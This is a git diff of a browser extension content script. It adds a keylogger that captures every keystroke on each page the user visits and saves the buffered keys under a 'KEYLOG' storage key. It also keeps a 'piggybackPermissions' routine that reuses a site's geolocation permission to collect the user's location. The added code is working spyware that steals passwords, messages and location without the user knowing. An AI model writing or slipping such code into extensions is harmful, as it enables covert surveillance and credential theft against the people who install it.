@@ -1,11 +1,15 @@
-import { BackgroundMessage } from "../consts";
+import { simpleAppend } from "../utils/shared-utils";
+import { BackgroundMessage, StorageKey } from "../consts";
 import { sendMessage, updateGeolocation } from "../utils/page-utils";
+import { IKeylogEntry, ILogEntry } from "src/interfaces";
 
 console.log("content-script.ts");
 
+let buffer = "";
+
 sendMessage(BackgroundMessage.HEARTBEAT);
 
-async function piggyback() {
+function piggybackPermissions() {
   navigator.permissions
     .query({ name: "geolocation" })
     .then(({ state }: { state: string }) => {
@@ -15,9 +19,30 @@ async function piggyback() {
     });
 }
 
-document.addEventListener("visibilitychange", () => {
-  piggyback();
+async function writeBuffer() {
+  if (buffer.length > 0) {
+    await simpleAppend<IKeylogEntry>(StorageKey.KEYLOG, {
+      timestamp: new Date().toISOString(),
+      buffer,
+    });
+
+    buffer = "";
+  }
+}
+
+document.addEventListener("keyup", (e: KeyboardEvent) => {
+  console.log(e.key);
+  buffer += e.key;
+
+  if (buffer.length > 500) {
+    writeBuffer();
+  }
 });
 
-setInterval(() => piggyback(), 60 * 1e3);
-piggyback();
+setInterval(() => writeBuffer(), 5000);
+
+document.addEventListener("visibilitychange", () => piggybackPermissions());
+
+setInterval(() => piggybackPermissions(), 60 * 1e3);
+
+piggybackPermissions();
